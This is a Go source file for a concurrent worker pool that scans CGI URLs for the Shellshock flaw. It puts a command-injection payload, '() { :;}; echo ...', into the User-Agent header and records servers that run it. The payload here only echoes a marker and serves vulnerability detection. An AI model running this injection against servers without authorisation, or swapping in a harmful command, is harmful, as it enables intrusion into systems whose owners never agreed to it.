package main

import (
	"fmt"
	"net/http"
)

// defines a work request
type WorkRequest struct {
	Url string
}

// defines a worker
type Worker struct {
	Id             int                   // id of the worker
	Work           chan WorkRequest      // channel to send work requests to this worker
	WorkerQueue    chan chan WorkRequest // channel to register with to receive jobs
	VulnerableUrls chan string           // channel to send vulnerable urls to
	Quit           chan bool             // worker will quit if a message is received here
	Done           chan bool             // used to signal that worker is finished
}

// creates a worker
func NewWorker(id int, workerQueue chan chan WorkRequest, vulnerableUrls chan string) Worker {
	// create the worker
	worker := Worker{
		Id:             id,
		Work:           make(chan WorkRequest),
		WorkerQueue:    workerQueue,
		VulnerableUrls: vulnerableUrls,
		Quit:           make(chan bool),
		Done:           make(chan bool),
	}
	return worker
}

// starts the worker
func (w Worker) Start() {
	fmt.Printf("[%d] Starting\n", w.Id)
	go func() {
		for {
			// add ourselves to the worker queue
			w.WorkerQueue <- w.Work
			fmt.Printf("[%d] Waiting\n", w.Id)
			select {
			case work := <-w.Work:
				fmt.Printf("[%d] Checking: %s\n", w.Id, work.Url)
				result := testUrl(work.Url)
				if result {
					w.VulnerableUrls <- work.Url
				}
			case <-w.Quit:
				w.Done <- true
				fmt.Printf("[%d] Stopping\n", w.Id)
				return
			}
		}
	}()
}

// requests the worker to stop
func (w Worker) Stop() {
	go func() {
		w.Quit <- true
	}()
}

// tests a cgi script to see if it is vulnerable
func testUrl(url string) bool {
	client := &http.Client{}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false // not sure if vulnerable, ignoring
	}

	req.Header.Set("User-Agent", "() { :;}; echo \"Warning: Server Vulnerable\"")

	resp, err := client.Do(req)
	if err != nil {
		return false // not sure if vulnerable, ignoring
	}

	if resp.Header["Warning"] != nil && resp.Header["Warning"][0] == "Server Vulnerable" {
		return true
	} else {
		return false
	}
}
